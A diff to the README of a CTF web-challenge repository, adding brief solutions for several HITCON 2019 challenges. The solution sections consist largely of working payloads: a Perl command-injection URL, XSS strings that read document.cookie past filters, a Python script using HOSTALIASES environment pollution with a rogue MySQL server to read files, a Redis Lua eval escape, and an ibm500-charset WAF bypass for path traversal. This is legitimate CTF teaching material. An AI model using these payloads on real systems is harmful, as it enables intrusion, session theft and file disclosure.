@@ -1,27 +1,35 @@
 
 # My CTF Web Challenges
 
-This is the repo of CTF challenges I made, including the source code, write-up and idea explanation!
+This is the repository of all CTF challenges I made, including the source code, write-up and idea explanation!
 Hope you like it :)  
 
 
-**P.s.** BTW, `Babyfirst` series are my favorite in all challenges. If you don't have time to see all, please look the them at least!
+**P.s.** BTW, the `Babyfirst` series and `One Line PHP Challenge` are my favorite challenges. If you haven't enough time, please look them at least!
 
 * [Babyfirst](#babyfirst)  
 * [Babyfirst Revenge](#babyfirst-revenge)  
 * [Babyfirst Revenge v2](#babyfirst-revenge-v2)  
+* [One Line PHP Challenge](#one-line-php-challenge)  
 
 <br>
 
-You can contact me via:  
-* orange@chroot.org   
-* [blog.orange.tw](http://blog.orange.tw/)   
-* [@orange_8361](https://twitter.com/orange_8361)  
+And you can find me via:  
+* Email: orange@chroot.org   
+* Blog: [http://blog.orange.tw](http://blog.orange.tw/)   
+* Twitter: [@orange_8361](https://twitter.com/orange_8361)  
 
 <br>
 
 
 ## **Table of Content**
+
+* [HITCON 2019 Quals](#virtual-public-network)
+    * [Virtual Public Network](#virtual-public-network)
+    * [Bounty Pl33z](#bounty-pl33z)
+    * [GoGo PowerSQL](#gogo-powersql)
+    * [Luatic](#luatic)
+    * [Buggy .Net](#buggy-net)  
 
 * [HITCON 2018](#one-line-php-challenge)
     * [One Line PHP Challenge](#one-line-php-challenge)
@@ -63,6 +71,187 @@ You can contact me via:
     * [SQLPWN](#sqlpwn)
     
 <br>
+
+## **Virtual Public Network**
+  
+Difficulty: **★☆**  
+Solved: **81 / 1147**  
+Tag:   **WhiteBox**, **Perl**, **Command Injection**  
+
+#### Source Code
+
+* [Source](hitcon-ctf-2019/virtual-public-network/)  
+
+#### Solution
+
+* Refer my blog and Black Hat 2019 USA slides for details 
+    * [Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!](https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html)
+    * [Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)  
+
+```
+http://13.231.137.9/cgi-bin/diag.cgi
+?options=-r@a="ls -alh /",system@a%23 2>tmp/orange.thtml <
+&tpl=orange
+```
+
+
+#### Write Ups
+
+* TBD
+
+
+## **Bounty Pl33z**
+  
+Difficulty: **★★★☆**  
+Solved: **30 / 1147**  
+Tag:   **XSS**
+
+#### Source Code
+
+* [Website](hitcon-ctf-2019/bounty-pl33z/web/)  
+* [XSS bot](hitcon-ctf-2019/bounty-pl33z/bot/)  
+
+#### Solution
+
+* Idea from [@FD](https://twitter.com/filedescriptor) - A little known JavaScript comment style [SingleLineHTMLOpenComment](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-SingleLineHTMLOpenComment) and [HTMLCloseComment](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-HTMLCloseComment) in EMCA specification. 
+
+Here we use unicode `U+2028` and `U+3002` to bypass `\n` and `.` filters.
+
+```
+http://3.114.5.202/fd.php
+?q=ssl。orange。tw?xx"+document[`cookie`]%E2%80%A8-->
+```
+
+#### Unintended Solution
+
+* Nesting template expression
+
+```
+http://3.114.5.202/fd.php
+?q=ssl。orange。tw?`+"+document[`cookie`];(`${`
+```
+
+#### Write Ups
+
+* TBD
+
+## **GoGo PowerSQL**
+  
+Difficulty: **★★★☆**  
+Solved: **16 / 1147**  
+Tag:   **Environment Injection**, **MySQL Client Attack**
+
+#### Source Code
+
+* [Docker](hitcon-ctf-2019/gogo-powersql/)  
+
+#### Solution
+
+1. Buffer Overflow the `DB_HOST` in BSS
+2. Due to the [patch](hitcon-ctf-2019/gogo-powersql/Dockerfile#L20), we can pollute environment variable which are not in the [Blacklist](https://github.com/embedthis/goahead/blob/v4.0.0/src/cgi.c#L170).
+3. Hijack MySQL connection by ENV such as `LOCALDOMAIN` or `HOSTALIAES`
+4. Read `/FLAG` by `LOAD DATA LOCAL INFILE`.
+
+```python
+import requests
+
+payload = ['x=x' for x in range(254)]
+payload.append('name=x')
+payload.append('HOSTALIASES=/proc/self/fd/0')
+payload.append('orangeeeee=go')
+payload = '&'.join(payload)
+
+data = 'orangeeeee my.orange.tw'
+
+r = requests.post('http://13.231.38.172/cgi-bin/query?'+payload, data=data)
+print r.content
+```
+
+```shell
+$ git clone https://github.com/lcark/MysqlClientAttack.git
+$ cd MysqlClientAttack
+$ python main.py -F /FLAG
+```
+
+
+
+#### Write Ups
+
+* TBD
+
+## **Luatic**
+  
+Difficulty: **★★☆**  
+Solved: **42 / 1147**  
+Tag:   **WhiteBox**, **Redis**, **Lua**
+
+#### Source Code
+
+* [Docker](hitcon-ctf-2019/luatic/)  
+
+#### Solution
+
+1. Override PHP global variables.
+2. Redis [implements](https://github.com/antirez/redis/blob/ee1cef189fff604f165b2d20a307545840de944e/src/scripting.c#L1363) `eval` command by string concatenations so that we can escape the original Lua function to override global objects.
+
+```
+http://54.250.242.183/luatic.php
+?_POST[TEST_KEY]=return 1 end function math:random() return 2
+&_POST[TEST_VALUE]=0
+&_POST[MY_SET_COMMAND]=eval
+&_POST[token]=<token>
+&_POST[guess]=2
+```
+
+```
+http://54.250.242.183/luatic.php
+?_POST[token]=<token>
+&_POST[guess]=2
+```
+
+#### Unintended Solution
+
+* Lua is so magic that there are several unintended solutions. Sorry for the imperfect challenge :(
+
+#### Write Ups
+
+* TBD
+
+## **Buggy .Net**
+  
+Difficulty: **★☆**  
+Solved: **13 / 1147**  
+Tag:   **ASP.NET**, **WhiteBox**
+
+#### Source Code
+
+* [Default.aspx](hitcon-ctf-2019/buggy-net/Default.aspx)  
+
+#### Solution
+
+* Using .NET request validation to trigger the exception and bypass the filter
+* Idea from [Soroush Dalili](https://twitter.com/irsdl)'s  [WAF Bypass Techniques - Using HTTP Standard and Web Servers' Behaviour](https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour) in AppSec Europe 2018(p30~p34)  
+
+```
+GET / HTTP/1.1
+Host: buggy
+Content-Type: application/x-www-form-urlencoded; charset=ibm500
+Content-Length: 61
+
+%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
+```
+
+```python
+from urllib import quote
+
+s = lambda x: quote(x.encode('ibm500'))
+print '%s=%s&x=%s' % (s('filename'), s('../../FLAG.txt', '<x>'))
+```
+
+#### Write Ups
+
+* TBD
+
 
 ## **One Line PHP Challenge**
   
